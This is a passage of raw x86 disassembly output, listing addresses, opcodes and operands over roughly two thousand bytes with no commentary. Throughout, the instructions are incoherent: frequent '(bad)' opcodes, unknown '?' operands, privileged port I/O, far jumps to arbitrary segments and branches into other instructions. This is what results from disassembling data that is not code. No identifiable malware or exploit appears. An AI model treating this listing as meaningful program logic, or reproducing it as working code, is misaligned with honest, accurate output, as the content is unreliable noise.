  4267e9:	out    0x9f,eax
  4267eb:	test   eax,0xabf1f2c5
  4267f0:	xchg   DWORD PTR [edi],esp
  4267f2:	mov    ds:0xa9e1a40b,eax
  4267f7:	mov    dh,0xa9
  4267f9:	fisub  WORD PTR [esi-0x1f]
  4267fc:	xchg   esp,eax
  4267fd:	cmc    
  4267fe:	cmp    edx,edi
  426800:	mov    ebp,ebx
  426802:	pop    edi
  426803:	push   ebx
  426804:	dec    ecx
  426805:	int    0xf
  426807:	add    al,0x8a
  426809:	fidiv  DWORD PTR [esi+0x50]
  42680c:	out    0xe2,al
  42680e:	mov    dh,0x74
  426810:	sbb    esp,DWORD PTR [ecx]
  426812:	jle    0x42687c
  426814:	stc    
  426815:	sbb    eax,0x8e747bb4
  42681a:	mov    ch,0x28
  42681c:	pop    DWORD PTR [ebx]
  42681e:	(bad)  
  42681f:	imul   bl
  426821:	mov    eax,ds:0xa4b017f7
  426826:	daa    
  426827:	out    dx,al
  426828:	in     al,dx
  426829:	pushf  
  42682a:	iret   
  42682b:	mov    ah,BYTE PTR [ecx+0x44]
  42682e:	fbld   TBYTE PTR [edi-0x4c]
  426831:	mov    ?,WORD PTR [esi]
  426833:	push   cs
  426834:	je     0x4267ce
  426836:	ror    BYTE PTR [eax+0x1bef313b],cl
  42683c:	loopne 0x426825
  42683e:	sbb    dh,dh
  426840:	push   0x8cce61a4
  426845:	dec    eax
  426846:	ins    DWORD PTR es:[edi],dx
  426847:	mov    al,0x6d
  426849:	pop    esi
  42684a:	cmp    eax,0xe5c2d334
  42684f:	aam    0x4e
  426851:	retf   
  426852:	cmp    DWORD PTR [esp+eax*8],ebx
  426855:	aas    
  426856:	pop    esp
  426857:	jbe    0x4267f2
  426859:	jmp    0x467d:0x2fc06864
  426860:	dec    bh
  426862:	sahf   
  426863:	xchg   ch,dh
  426865:	and    eax,0x6d1ab7b3
  42686a:	rol    DWORD PTR [edi],1
  42686c:	mov    al,0xbd
  42686e:	jmp    0xe815:0x6b1b9053
  426875:	int    0xc7
  426877:	inc    esi
  426878:	mov    bl,0xd4
  42687a:	retf   
  42687b:	add    eax,0x1f9def40
  426880:	mov    WORD PTR [ecx-0x66],es
  426883:	jmp    0x7b07:0xf61537d
  42688a:	jne    0x426816
  42688c:	jnp    0x426856
  42688e:	and    al,0x18
  426890:	call   0x73e703a4
  426895:	push   cs
  426896:	jns    0x426886
  426898:	or     BYTE PTR ds:0xf0b852db,cl
  42689e:	pop    ebx
  42689f:	sub    BYTE PTR [esi+0x429d6e0c],0x9
  4268a6:	mov    al,0x43
  4268a8:	adc    dl,BYTE PTR [ebx]
  4268aa:	dec    ebx
  4268ab:	cdq    
  4268ac:	mov    eax,ds:0x92ea93aa
  4268b1:	adc    BYTE PTR [ebx+0x16],bl
  4268b4:	outs   dx,DWORD PTR ds:[esi]
  4268b5:	push   0xd2d33564
  4268ba:	popw   es
  4268bc:	sbb    DWORD PTR [edi+0x18],eax
  4268bf:	jg     0x4268fc
  4268c1:	push   edx
  4268c2:	dec    ebp
  4268c3:	ins    DWORD PTR es:[edi],dx
  4268c4:	fisttp DWORD PTR [ecx-0x53e6dc92]
  4268ca:	stos   DWORD PTR es:[edi],eax
  4268cb:	aam    0x5
  4268cd:	xchg   esi,eax
  4268ce:	push   ecx
  4268cf:	daa    
  4268d0:	iret   
  4268d1:	sbb    dl,BYTE PTR [ebx-0x44]
  4268d4:	jge    0x42693e
  4268d6:	jb     0x42689c
  4268d8:	(bad)  
  4268d9:	out    0xf0,al
  4268db:	bnd jmp 0x426863
  4268de:	push   ebp
  4268df:	dec    ebx
  4268e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4268e1:	pop    ebx
  4268e2:	int3   
  4268e3:	dec    esi
  4268e4:	mov    dh,0xbe
  4268e6:	repnz sub esp,DWORD PTR es:[ebx-0x1e4abe6a]
  4268ee:	jl     0x4268ba
  4268f0:	dec    ebx
  4268f1:	(bad)  
  4268f2:	cwde   
  4268f3:	pop    ecx
  4268f4:	das    
  4268f5:	in     al,dx
  4268f6:	xchg   esi,eax
  4268f7:	add    eax,0x58aacfbc
  4268fc:	daa    
  4268fd:	icebp  
  4268fe:	sub    edi,DWORD PTR [ebp+0x6a69188]
  426904:	cmp    al,0x6c
  426906:	and    al,0x91
  426908:	lds    edx,FWORD PTR [edi]
  42690a:	add    ebx,eax
  42690c:	nop
  42690d:	or     BYTE PTR [edi+0x301ccce5],dh
  426913:	push   ecx
  426914:	xchg   ebp,eax
  426915:	jp     0x426983
  426917:	or     bl,BYTE PTR [ecx]
  426919:	cli    
  42691a:	stos   DWORD PTR es:[edi],eax
  42691b:	jmp    0xff2f78e3
  426920:	iret   
  426921:	adc    BYTE PTR [esi-0x4e],dh
  426924:	(bad)  
  426925:	imul   BYTE PTR [edx-0x69a403de]
  42692b:	repnz push ebp
  42692d:	imul   ebx,DWORD PTR [edi+ebp*2+0x43c38201],0xb356ab0b
  426938:	shl    dl,1
  42693a:	mov    eax,0xf2572d0f
  42693f:	mov    al,ds:0x40090655
  426944:	sahf   
  426945:	dec    edx
  426946:	test   DWORD PTR [ecx-0x71927701],eax
  42694c:	xchg   al,dl
  42694e:	(bad)  
  42694f:	int    0xdd
  426951:	sbb    ebx,eax
  426953:	or     eax,0x66a4f873
  426958:	inc    edx
  426959:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42695a:	dec    esi
  42695b:	sbb    ecx,DWORD PTR [edi-0x6f]
  42695e:	bound  esi,QWORD PTR [edi+edx*2-0x13]
  426962:	lahf   
  426963:	imul   ebx,DWORD PTR [esi+0x187f4fe9],0xe9fe078d
  42696d:	cmp    DWORD PTR [eax+0x5f],eax
  426970:	inc    edx
  426971:	retf   0x7523
  426974:	adc    ch,BYTE PTR [esi]
  426976:	push   es
  426977:	(bad)
  42697a:	xlat   BYTE PTR ds:[ebx]
  42697b:	sbb    eax,0x286ebc52
  426980:	xchg   ebx,eax
  426981:	xor    eax,0x95cb9e9f
  426986:	adc    cl,ah
  426988:	fdiv   DWORD PTR [edx-0x434b2571]
  42698e:	push   edx
  42698f:	xor    BYTE PTR [ebp+0x2c],ah
  426992:	cmp    dh,BYTE PTR [esi]
  426994:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426995:	(bad)  
  426996:	sar    dh,cl
  426998:	(bad)  
  426999:	dec    ebx
  42699a:	aam    0x2f
  42699c:	push   edx
  42699d:	int    0x10
  42699f:	cs jmp 0x426966
  4269a2:	lea    eax,[ecx]
  4269a4:	sahf   
  4269a5:	out    dx,eax
  4269a6:	or     BYTE PTR [edx-0x30],cl
  4269a9:	and    eax,0xba98c5a5
  4269ae:	in     eax,dx
  4269af:	dec    ebp
  4269b0:	and    ecx,DWORD PTR cs:[esi-0x7762573a]
  4269b7:	les    eax,FWORD PTR [eax]
  4269b9:	mov    ecx,DWORD PTR [edi]
  4269bb:	jmp    0xf4bbdcf0
  4269c0:	fmul   st(7),st
  4269c2:	mov    ebp,0x413a7345
  4269c7:	pop    ebx
  4269c8:	xor    eax,edx
  4269ca:	add    eax,0x8d638fc1
  4269cf:	(bad)  
  4269d1:	lds    sp,DWORD PTR [ecx-0x4c2977af]
  4269d8:	cmc    
  4269d9:	aam    0x27
  4269db:	xor    BYTE PTR [edi+0x6f],cl
  4269de:	pop    ss
  4269df:	sub    ah,dh
  4269e1:	loope  0x42698e
  4269e3:	and    BYTE PTR [ebx-0x7a9e19eb],bl
  4269e9:	daa    
  4269ea:	mov    esp,esp
  4269ec:	mov    al,0xe3
  4269ee:	sbb    bh,ah
  4269f0:	jb     0x426a13
  4269f2:	(bad)  
  4269f3:	fidiv  WORD PTR [ecx]
  4269f5:	lock pop eax
  4269f7:	sub    esp,eax
  4269f9:	aaa    
  4269fa:	mov    ch,0xbc
  4269fc:	sar    DWORD PTR [edx],0x7d
  4269ff:	data16 (bad) 
  426a01:	retf   0x36f2
  426a04:	fcom   st(5)
  426a06:	lods   al,BYTE PTR ds:[esi]
  426a07:	push   0xc5f42b0f
  426a0c:	mov    ecx,0xe568479c
  426a11:	sub    ecx,DWORD PTR [ecx]
  426a13:	fucomp st(4)
  426a15:	push   ds
  426a16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426a17:	lea    esi,[ecx+0x447a5382]
  426a1d:	nop
  426a1e:	mov    esi,0xa2a1632a
  426a23:	push   ebp
  426a24:	sar    ch,0x9b
  426a27:	std    
  426a28:	pop    esi
  426a29:	dec    edx
  426a2a:	test   eax,0xda405aa3
  426a2f:	ins    DWORD PTR es:[edi],dx
  426a30:	mov    eax,0xee35b94c
  426a35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a36:	test   eax,0xc679f733
  426a3b:	pop    ss
  426a3c:	sahf   
  426a3d:	push   0x4f
  426a3f:	popa   
  426a40:	jbe    0x426a55
  426a42:	adc    al,0x82
  426a44:	and    BYTE PTR [eax],dl
  426a46:	rol    BYTE PTR [ebp-0x63],cl
  426a49:	xlat   BYTE PTR ds:[ebx]
  426a4a:	and    ax,0x2355
  426a4e:	jns    0x426a43
  426a50:	xchg   edx,eax
  426a51:	push   ecx
  426a52:	xchg   ebx,eax
  426a53:	out    dx,al
  426a54:	fistp  DWORD PTR [ecx]
  426a56:	rcl    edi,cl
  426a58:	sbb    DWORD PTR [esi-0x1398c560],edx
  426a5e:	cdq    
  426a5f:	ror    BYTE PTR [ebp+0x6c],1
  426a62:	ret    0x5b21
  426a65:	push   ds
  426a66:	ficomp DWORD PTR [edi+0x7c]
  426a69:	dec    di
  426a6b:	jnp    0x426a13
  426a6d:	inc    ebp
  426a6e:	push   esi
  426a6f:	cwde   
  426a70:	cwde   
  426a71:	inc    edi
  426a72:	and    DWORD PTR [ebx-0x57],0x277cc6ca
  426a79:	jne    0x426aef
  426a7b:	xchg   BYTE PTR ds:0x22cd76d8,bl
  426a81:	jecxz  0x426ae4
  426a83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426a84:	xor    eax,0x28017a4e
  426a89:	cmp    bl,BYTE PTR [edi-0x14]
  426a8c:	mov    dl,0x1b
  426a8e:	lds    esi,FWORD PTR [eax]
  426a90:	(bad)  
  426a91:	(bad)  
  426a92:	jnp    0x426ada
  426a94:	mov    eax,0x1817dea5
  426a99:	or     ch,BYTE PTR [ebp-0x18]
  426a9c:	push   esp
  426a9d:	dec    ecx
  426a9e:	jl     0x426aeb
  426aa0:	push   ds
  426aa1:	add    al,0xa9
  426aa3:	and    al,0x12
  426aa5:	and    ecx,DWORD PTR [ebx]
  426aa7:	shr    DWORD PTR [esi-0x59],1
  426aaa:	pop    esp
  426aab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426aac:	ret    0x16b1
  426aaf:	cmc    
  426ab0:	cmp    BYTE PTR [eax-0x4b64bcd3],0x32
  426ab7:	xchg   ecx,eax
  426ab8:	mov    ebp,0x673207d3
  426abd:	sub    bl,ch
  426abf:	bnd jo 0x426a47
  426ac2:	push   cs
  426ac3:	dec    eax
  426ac4:	fdivr  QWORD PTR [ebp-0x11]
  426ac7:	lds    ebx,FWORD PTR ds:0xe4d94f30
  426acd:	sbb    al,0x72
  426acf:	(bad)
  426ad2:	test   eax,0x2b861144
  426ad7:	test   DWORD PTR [ebx+0x1f18524a],edx
  426add:	loope  0x426a63
  426adf:	mov    eax,ds:0x4e4ca876
  426ae4:	mov    ?,WORD PTR [edi+0x6c]
  426ae7:	mov    edx,0x9e97656
  426aec:	iret   
  426aed:	mov    esi,0xf18e8428
  426af2:	cld    
  426af3:	xor    ebx,DWORD PTR [ebx+edx*1-0x2c1220c2]
  426afa:	jbe    0x426a96
  426afc:	push   ecx
  426afd:	test   BYTE PTR [eax],bl
  426aff:	and    al,0xc3
  426b01:	bound  esp,QWORD PTR [ebx]
  426b03:	rcl    ecx,cl
  426b05:	stos   DWORD PTR es:[edi],eax
  426b06:	sub    DWORD PTR [edi],esp
  426b08:	pop    ebx
  426b09:	add    eax,0x85860600
  426b0e:	into   
  426b0f:	in     eax,dx
  426b10:	inc    ebx
  426b11:	(bad)  
  426b12:	stc    
  426b13:	cmp    BYTE PTR [edx+0x76],dh
  426b16:	and    ebp,DWORD PTR [eax]
  426b18:	aaa    
  426b19:	push   esi
  426b1a:	sub    DWORD PTR [eax-0x25002e7b],ebx
  426b20:	inc    ebx
  426b21:	and    ecx,DWORD PTR [edx]
  426b23:	jae    0x426acf
  426b25:	lods   eax,DWORD PTR ds:[esi]
  426b26:	sbb    BYTE PTR [edi-0x51ee3006],bh
  426b2c:	jmp    0xcf13:0xa70ff1c6
  426b33:	lods   eax,DWORD PTR ds:[esi]
  426b34:	xchg   edx,eax
  426b35:	xchg   edx,eax
  426b36:	or     eax,0x5c5245ae
  426b3b:	jo     0x426b7b
  426b3d:	push   ss
  426b3e:	sahf   
  426b3f:	cmc    
  426b40:	inc    edx
  426b41:	scas   al,BYTE PTR es:[edi]
  426b42:	add    DWORD PTR [ecx+ecx*8],esp
  426b45:	xor    DWORD PTR [ecx-0x5ca00671],0xfffffff3
  426b4c:	(bad)  
  426b4d:	mov    edi,0xaea9bf34
  426b52:	push   ebp
  426b53:	cmp    DWORD PTR [edi],edi
  426b55:	pop    ecx
  426b56:	push   ebx
  426b57:	push   esi
  426b58:	fs aas 
  426b5a:	ficom  DWORD PTR [edi]
  426b5c:	repz mov ds:0x7560305,eax
  426b62:	lods   al,BYTE PTR ds:[esi]
  426b63:	sar    BYTE PTR [eax],0xa6
  426b66:	xor    dh,BYTE PTR [ebp+0x11505a1f]
  426b6c:	pop    ebx
  426b6d:	sbb    BYTE PTR [ebx],0x12
  426b70:	jecxz  0x426afd
  426b72:	outs   dx,DWORD PTR ds:[esi]
  426b73:	jmp    0x1ae4:0x31416e46
  426b7a:	stos   DWORD PTR es:[edi],eax
  426b7b:	lds    eax,FWORD PTR [esi]
  426b7d:	jmp    0x2719:0x7e335da7
  426b84:	cmp    edx,esp
  426b86:	into   
  426b87:	and    dl,al
  426b89:	cmc    
  426b8a:	sub    DWORD PTR [ebp-0x45],ecx
  426b8d:	gs inc ebp
  426b8f:	popf   
  426b90:	push   0x4d85c581
  426b95:	lds    edi,FWORD PTR [edx-0x22c3da2c]
  426b9b:	adc    DWORD PTR [ecx],edi
  426b9d:	push   ss
  426b9e:	sbb    dh,BYTE PTR [ebx]
  426ba0:	rol    BYTE PTR [ecx-0x7b],cl
  426ba3:	sub    ch,BYTE PTR ds:0xfce87821
  426ba9:	cmc    
  426baa:	mov    ds:0xbfb5d74c,al
  426baf:	fnstsw WORD PTR [edi+0x5e]
  426bb2:	mov    WORD PTR [esi+0x326c180e],cs
  426bb8:	or     eax,0x7bb63272
  426bbd:	and    eax,0xaab3e2ed
  426bc2:	loop   0x426bb1
  426bc4:	ret    
  426bc5:	dec    ch
  426bc7:	or     edi,ecx
  426bc9:	lock lds esp,FWORD PTR [ebp-0x30738723]
  426bd0:	push   edx
  426bd1:	inc    ecx
  426bd2:	or     BYTE PTR [esi+0x28d33e91],al
  426bd8:	xor    BYTE PTR [edi+0x76f796e8],bl
  426bde:	and    ebp,DWORD PTR [esi+0x59]
  426be1:	xor    dl,ch
  426be3:	mov    dh,0xf3
  426be5:	mov    al,ds:0x176d7f3a
  426bea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426beb:	rcl    BYTE PTR [eax],cl
  426bed:	fbstp  TBYTE PTR [ebx+eax*8-0x2]
  426bf1:	popa   
  426bf2:	push   0x14
  426bf4:	sbb    eax,0x8c15db82
  426bf9:	scas   eax,DWORD PTR es:[edi]
  426bfa:	aaa    
  426bfb:	cdq    
  426bfc:	mov    dh,0x19
  426bfe:	aam    0xc4
  426c00:	mov    ecx,0x9b5287b1
  426c05:	lock push edi
  426c07:	ret    0x6892
  426c0a:	xchg   ebx,eax
  426c0b:	mov    WORD PTR [edx+0x4],?
  426c0e:	and    eax,0xcebb78e8
  426c13:	ins    DWORD PTR es:[edi],dx
  426c14:	or     DWORD PTR [ebx-0x4f91cf7c],esi
  426c1a:	push   cs
  426c1b:	dec    ebx
  426c1c:	add    al,0x24
  426c1e:	push   0x10469d7b
  426c23:	test   al,0x89
  426c25:	nop
  426c26:	xchg   edx,eax
  426c27:	sub    BYTE PTR [ebp-0x19dbe2b3],cl
  426c2d:	into   
  426c2e:	cdq    
  426c2f:	push   0x8ab66fff
  426c34:	jmp    0x6214295e
  426c39:	xchg   BYTE PTR [ecx-0x46],bh
  426c3c:	fld    TBYTE PTR [ebx-0x27]
  426c3f:	scas   al,BYTE PTR es:[edi]
  426c40:	add    BYTE PTR [eax+edi*1+0xf],bh
  426c44:	xlat   BYTE PTR ds:[ebx]
  426c45:	adc    ecx,ebp
  426c47:	ret    0x1841
  426c4a:	xchg   DWORD PTR [eax],edi
  426c4c:	shr    ebp,0xe6
  426c4f:	or     ebp,DWORD PTR [ebx+0x7fbb3c85]
  426c55:	retf   
  426c56:	sub    DWORD PTR ds:0xbaa0e4c1,0xffffffd2
  426c5d:	sub    al,0x4d
  426c5f:	aaa    
  426c60:	lods   al,BYTE PTR ds:[esi]
  426c61:	jg     0x426c3e
  426c63:	out    dx,al
  426c64:	push   ss
  426c65:	sbb    BYTE PTR [edi-0x4fe79e92],bl
  426c6b:	adc    al,0xc1
  426c6d:	cdq    
  426c6e:	loope  0x426c0a
  426c70:	cwde   
  426c71:	jmp    edi
  426c73:	ficom  DWORD PTR [esi-0xa]
  426c76:	sbb    ch,BYTE PTR [edx-0x6ae2c4ac]
  426c7c:	fwait
  426c7d:	cmp    dh,dh
  426c7f:	mov    eax,ds:0x2b9543b2
  426c84:	sub    eax,0x619b7794
  426c89:	nop
  426c8a:	lock mov ah,ch
  426c8d:	xor    eax,0xfa6015c8
  426c92:	imul   eax,DWORD PTR [esi],0xc37f0fca
	...
  426d14:	and    eax,0x55d31474
  426d19:	repz out 0xf6,eax
  426d1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426d1d:	adc    bh,BYTE PTR [esi]
  426d1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426d20:	adc    cl,ch
  426d22:	test   bh,ch
  426d24:	popa   
  426d25:	inc    BYTE PTR [ecx]
  426d27:	add    BYTE PTR [edi+eax*1+0x0],ch
  426d2b:	add    BYTE PTR [ecx],ch
  426d2d:	leave  
  426d2e:	jp     0x426d94
  426d30:	push   ebp
  426d31:	add    al,cl
  426d33:	call   0xe304e5be
  426d38:	(bad)  
  426d39:	jo     0x426d31
  426d3b:	mov    dl,al
  426d3d:	push   ebx
  426d3e:	xor    edx,DWORD PTR [edx]
  426d40:	test   eax,0xe84602da
  426d45:	sahf   
  426d46:	push   edx
  426d47:	icebp  
  426d48:	sbb    eax,0xeedd0b36
  426d4d:	cmp    BYTE PTR [eax],ah
  426d4f:	xor    eax,0x4b7fa716
  426d54:	ins    DWORD PTR es:[edi],dx
  426d55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426d56:	in     eax,0x3d
  426d58:	xor    BYTE PTR [edi-0x74],cl
  426d5b:	icebp  
  426d5c:	mov    cl,0x87
  426d5e:	ins    DWORD PTR es:[edi],dx
  426d5f:	js     0x426d8d
  426d61:	pminsw mm5,QWORD PTR ds:[esi]
  426d65:	pop    ebp
  426d66:	xchg   al,al
  426d68:	fcomp  QWORD PTR [ebx+ebp*4]
  426d6b:	imul   DWORD PTR [ebx+0x11808ad9]
  426d71:	std    
  426d72:	repz add BYTE PTR [eax-0x56e7808a],ch
  426d79:	sub    BYTE PTR [edi+0x28],ah
  426d7c:	out    dx,eax
  426d7d:	pop    esi
  426d7e:	sbb    BYTE PTR [eax+edi*2-0x509c541d],al
  426d85:	push   eax
  426d86:	mov    ds:0xbc5d77a8,eax
  426d8b:	jne    0x426d49
  426d8d:	stc    
  426d8e:	(bad)  
  426d8f:	inc    ebp
  426d90:	fild   WORD PTR [edx+0x55829ced]
  426d96:	sbb    cl,al
  426d98:	mov    cs,WORD PTR [ebp+0x1e]
  426d9b:	stc    
  426d9c:	jle    0x426d30
  426d9e:	add    BYTE PTR [edx-0x42],0xb3
  426da2:	std    
  426da3:	call   0x533b55fe
  426da8:	pusha  
  426da9:	stc    
  426daa:	test   al,0x6c
  426dac:	cmp    DWORD PTR [ecx],ecx
  426dae:	jo     0x426d54
  426db0:	loop   0x426e2f
  426db2:	inc    esi
  426db3:	pop    ecx
  426db4:	daa    
  426db5:	in     al,dx
  426db6:	mov    dh,0xc
  426db8:	add    BYTE PTR [edx],al
  426dba:	arpl   WORD PTR [esi],bx
  426dbc:	mov    BYTE PTR [eax+0x1c],cl
  426dbf:	xchg   DWORD PTR [ebx+0xe],ecx
  426dc2:	in     al,dx
  426dc3:	dec    esi
  426dc4:	ja     0x426df6
  426dc6:	dec    edx
  426dc7:	dec    edx
  426dc8:	lahf   
  426dc9:	or     DWORD PTR [esp+edi*2-0x274d47db],ebx
  426dd0:	ror    cl,cl
  426dd2:	mov    eax,ds:0x372e2449
  426dd7:	cmp    ebx,edx
  426dd9:	dec    ebx
  426dda:	rcr    BYTE PTR [ebp+eiz*4+0x33],cl
  426dde:	fbld   TBYTE PTR [edi-0x7c]
  426de1:	(bad)  
  426de2:	push   0xffffffad
  426de4:	pop    esp
  426de5:	sti    
  426de6:	xor    ebx,esp
  426de8:	xchg   esi,eax
  426de9:	lods   eax,DWORD PTR ds:[esi]
  426dea:	stos   DWORD PTR es:[edi],eax
  426deb:	xchg   edi,eax
  426dec:	and    ebx,eax
  426dee:	mov    ebx,0x519aca80
  426df3:	cmp    dl,BYTE PTR [bp+di+0x6f69]
  426df8:	xchg   esp,eax
  426df9:	xchg   edi,eax
  426dfa:	iret   
  426dfb:	mov    esp,0x23387f30
  426e00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426e01:	cmp    BYTE PTR [eax],bh
  426e03:	xlat   BYTE PTR ds:[ebx]
  426e04:	ret    0xb9dc
  426e07:	add    eax,0x2d2d54ca
  426e0c:	cmp    BYTE PTR [eax],cl
  426e0e:	ror    DWORD PTR [edi-0x23accb13],0xdb
  426e15:	imul   esp,DWORD PTR [ecx-0x5011a1d7],0xffffffa8
  426e1c:	out    0x42,eax
  426e1e:	push   es
  426e1f:	mov    ch,0x1c
  426e21:	push   es
  426e22:	(bad)  
  426e23:	idiv   DWORD PTR [eax-0x7b7783bc]
  426e29:	int    0x9e
  426e2b:	lds    edi,FWORD PTR [edx+0x397fe031]
  426e31:	inc    esp
  426e32:	jecxz  0x426e63
  426e34:	hlt    
  426e35:	int3   
  426e36:	mov    eax,0xd15ff2fc
  426e3b:	jecxz  0x426ea8
  426e3d:	mov    eax,0x437a061f
  426e42:	mov    bl,0x6b
  426e44:	ret    
  426e45:	in     eax,dx
  426e46:	inc    ebx
  426e47:	xchg   esi,eax
  426e48:	or     ebx,edi
  426e4a:	dec    esp
  426e4b:	in     al,dx
  426e4c:	dec    ebp
  426e4d:	jl     0x426ec6
  426e4f:	push   ebp
  426e50:	dec    edx
  426e51:	test   al,0x28
  426e53:	sub    edi,DWORD PTR [esi]
  426e55:	sbb    bh,0xac
  426e58:	xor    DWORD PTR [ebp+edi*8-0x6944aed9],esi
  426e5f:	xchg   edi,eax
  426e60:	and    DWORD PTR [edi-0x2c],0xffffff99
  426e64:	or     DWORD PTR [eax+0x78],esi
  426e67:	adc    eax,0x316256de
  426e6c:	icebp  
  426e6d:	leave  
  426e6e:	xchg   DWORD PTR ds:0xcbb7fe04,edx
  426e74:	cmp    ch,BYTE PTR fs:[ecx]
  426e77:	inc    BYTE PTR [ebp+0x68ea55fe]
  426e7d:	fmul   st(0),st
  426e7f:	push   ds
  426e80:	fst    QWORD PTR [edx-0x62]
  426e83:	or     BYTE PTR [ebp+0xfd5c88d],dl
  426e89:	cmp    al,BYTE PTR [edx]
  426e8b:	cs ret 0x793
  426e8f:	fidiv  WORD PTR [edx]
  426e91:	cmp    ch,0x4
  426e94:	shl    BYTE PTR [eax],1
  426e96:	push   0x3c
  426e98:	push   ds
  426e99:	test   eax,0xa3e0d92
  426e9e:	dec    eax
  426e9f:	imul   edx,DWORD PTR [eax],0x2d
  426ea2:	(bad)  
  426ea3:	dec    esp
  426ea4:	or     eax,0x57a13f25
  426ea9:	inc    ecx
  426eaa:	mov    BYTE PTR [eax-0x2a],ah
  426ead:	sbb    al,0x87
  426eaf:	aas    
  426eb0:	stc    
  426eb1:	out    0xc7,eax
  426eb3:	adc    al,0x6
  426eb5:	xlat   BYTE PTR ds:[ebx]
  426eb6:	jg     0x426ea5
  426eb8:	fbld   TBYTE PTR [eax+edi*2+0x76]
  426ebc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426ebd:	mov    al,0xe4
  426ebf:	cmp    DWORD PTR [edx+edx*4],edi
  426ec2:	and    eax,0xa3b02bb2
  426ec7:	test   eax,0xbf9e9d79
  426ecc:	aas    
  426ecd:	push   es
  426ece:	test   DWORD PTR [edi],eax
  426ed0:	or     eax,DWORD PTR ds:0x94663712
  426ed6:	jmp    0x426f24
  426ed8:	mov    esp,?
  426eda:	or     eax,0xdc7b0688
  426edf:	mov    cl,0x46
  426ee1:	xchg   BYTE PTR [ebx+esi*1],cl
  426ee4:	test   bl,0x14
  426ee7:	out    0xe7,al
  426ee9:	sub    edi,esi
  426eeb:	aad    0x82
  426eed:	push   edi
  426eee:	adc    esi,ecx
  426ef0:	dec    ebp
  426ef1:	leave  
  426ef2:	dec    ebx
  426ef3:	repnz pop ss
  426ef5:	and    dl,BYTE PTR [edx+0x8]
  426ef8:	pop    esp
  426ef9:	sbb    ebp,DWORD PTR [edx-0x4ad80e35]
  426eff:	fdecstp 
  426f01:	mov    edi,gs
  426f03:	in     eax,0xb3
  426f05:	mov    ah,0x22
  426f07:	pop    ss
  426f08:	cdq    
  426f09:	mov    ds:0x50c2fe1b,al
  426f0e:	push   ss
  426f0f:	jb     0x426ebd
  426f11:	push   0x54
  426f13:	sub    DWORD PTR [ecx+0x1e],esp
  426f16:	cmp    ah,dh
  426f18:	pushf  
  426f19:	pop    eax
  426f1a:	mov    ecx,0x383a2780
  426f1f:	xor    al,0xc4
  426f21:	addr16 test eax,0x32718c98
  426f27:	jo     0x426eaf
  426f29:	sub    BYTE PTR [edi+0x38],0x9c
  426f2d:	mov    DWORD PTR [esp+eax*2],ebx
  426f30:	mov    dh,0x53
  426f32:	ins    DWORD PTR es:[edi],dx
  426f33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426f34:	sub    ecx,DWORD PTR [esi]
  426f36:	mov    ebx,0xcba7821c
  426f3b:	mov    ds:0x2c4a11e8,eax
  426f40:	cmc    
  426f41:	xor    DWORD PTR [eax+0x58],eax
  426f44:	push   ecx
  426f45:	test   ebx,eax
  426f47:	sbb    BYTE PTR [eax],bh
  426f49:	popa   
  426f4a:	push   ecx
  426f4b:	cmp    DWORD PTR [ebx],ebx
  426f4d:	jmp    0xe573:0x3a85a287
  426f54:	jns    0x426f0d
  426f56:	lods   al,BYTE PTR ds:[esi]
  426f57:	adc    al,0x70
  426f59:	pop    ds
  426f5a:	ins    BYTE PTR es:[edi],dx
  426f5b:	mov    ebx,ds
  426f5d:	clc    
  426f5e:	in     al,0x69
  426f60:	jl     0x426f2e
  426f62:	or     ch,ch
  426f64:	pop    esp
  426f65:	pop    ebx
  426f66:	mov    eax,ds:0x8efc8070
  426f6b:	xchg   ebp,eax
  426f6c:	jle    0x426f1e
  426f6e:	out    dx,al
  426f6f:	ins    DWORD PTR es:[edi],dx
  426f70:	or     eax,0x43f1b8c6
  426f75:	push   es
  426f76:	sbb    BYTE PTR [edx+ecx*1-0x1e],bl
  426f7a:	mov    ds:0x85bcf7f9,eax
  426f7f:	cwde   
  426f80:	loop   0x426fe5
  426f82:	fistp  DWORD PTR [ebx-0x71647b9c]
  426f88:	add    ebx,DWORD PTR [eax]
  426f8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426f8b:	test   al,0xaf
  426f8d:	out    0x4,al
  426f8f:	pop    ebp
  426f90:	jle    0x426f3e
  426f92:	daa    
  426f93:	in     al,dx
  426f94:	xor    dh,al
  426f96:	imul   esp,esi,0x1e
  426f99:	sahf   
  426f9a:	jnp    0x426fda
  426f9c:	ja     0x426f48
  426f9e:	fisub  DWORD PTR [edx-0x44fa4382]
  426fa4:	xchg   ebx,eax
  426fa5:	mov    ah,0x52
  426fa7:	inc    ebx
  426fa8:	les    edx,FWORD PTR [eax+0x32]
  426fab:	xchg   ebp,eax
  426fac:	out    0x72,al
  426fae:	sub    BYTE PTR [eax-0x5b],cl
  426fb1:	mov    ecx,0x9e76dbab
  426fb6:	repz push edi
  426fb8:	les    edi,FWORD PTR [ebx+0x11]
  426fbb:	call   0x9fad7aba
  426fc0:	push   es
  426fc1:	sub    BYTE PTR [ecx],ah
  426fc3:	mov    ebp,0xcd2b85a9
  426fc8:	es lahf 
  426fca:	jae    0x42703c
  426fcc:	iret   
  426fcd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426fce:	sub    eax,0xd6929f7e
  426fd3:	inc    edx
  426fd4:	push   ds
  426fd5:	or     eax,DWORD PTR [edi+0x76]
  426fd8:	inc    edx
  426fd9:	out    0xff,eax
  426fdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426fdc:	dec    ecx
  426fdd:	mov    ah,0x12
  426fdf:	mov    ds:0x550c047c,al
  426fe4:	sbb    BYTE PTR [edx-0x14581437],al
  426fea:	(bad)  
  426feb:	xchg   edx,eax
  426fec:	push   0x838cd2d9
  426ff1:	inc    edi
  426ff2:	cli    
